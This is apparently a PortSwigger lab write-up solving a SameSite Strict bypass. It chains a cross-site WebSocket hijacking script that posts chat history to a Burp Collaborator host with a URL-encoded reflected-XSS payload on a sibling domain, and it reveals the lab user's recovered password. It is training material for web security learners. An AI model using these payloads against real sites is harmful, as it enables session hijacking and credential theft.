![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/5e649fb8-fd0c-4375-ba6a-87998c60c702)

### Solution

we go to live chat option in the lab site

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/4e7f03ac-d3c4-4e6b-a603-ec0329549444)

we randomly input some words in the textbox.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/18b92b52-cb0e-4d46-a170-c259387f0e4c)

 our browser has stored our sessions, and every time we visit this /chat webpage, our browser sends the session value

 ![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/c3eeffe6-1d45-4bb7-b495-87764009d1f1)

 the SameSite=Strict property prevents the session from being sent if the web is visited through code (javascript) automatically. But if you are manually changing the address bar to visit the chat webpage, the session is allowed to be sent. And once you visit that /chat through code, your browser won’t send the session value and this value would be forgotten by your browser. This explains why refreshing does not see the chats.

CSWSH proof of concept

```js
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/9956575b-5d1c-457d-a02a-02caa752e78c)

Now click on poll now in burp collab observe that you have received an HTTP interaction, which indicates that you've opened a new live chat connection with the target site.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/d24fe816-c273-405c-8b87-6259d8296169)

In the response, notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/d25b42c9-660f-424d-a642-8ad1946a45c9)

### Identify an additional vulnerability in the same "site"

In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an Access-Control-Allow-Origin header, which reveals a sibling domain at cms-YOUR-LAB-ID.web-security-academy.net.

Recreate the CSWSH script that you tested on the exploit server earlier.

```js
<script>
    var ws = new WebSocket('wss://0a40003304b259cd805944fe003500e0.web-security-academy.net/.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://87dsjwn795hq3zpus2sqpcmd84ev2rqg.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

URL encoding

```js
%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%34%30%30%30%33%33%30%34%62%32%35%39%63%64%38%30%35%39%34%34%66%65%30%30%33%35%30%30%65%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%38%37%64%73%6a%77%6e%37%39%35%68%71%33%7a%70%75%73%32%73%71%70%63%6d%64%38%34%65%76%32%72%71%67%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
```

Go back to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested, but use the URL-encoded CSWSH payload as the username parameter.

```js
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

Final payload 

```js
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%34%30%30%30%33%33%30%34%62%32%35%39%63%64%38%30%35%39%34%34%66%65%30%30%33%35%30%30%65%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%38%37%64%73%6a%77%6e%37%39%35%68%71%33%7a%70%75%73%32%73%71%70%63%6d%64%38%34%65%76%32%72%71%67%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=anything";
</script>
```
Store and Deliver the exploit 

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/5b587a7d-c5d1-4ecd-8fae-395631d32387)

now on the collaborator after typing poll now we can view the password

username `carlos` password `hcdgwe1767oor7lfymqe`

log in using the credentials

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/80b30456-0ed7-46c8-b398-173e430c23d2)

lab solved succesfully
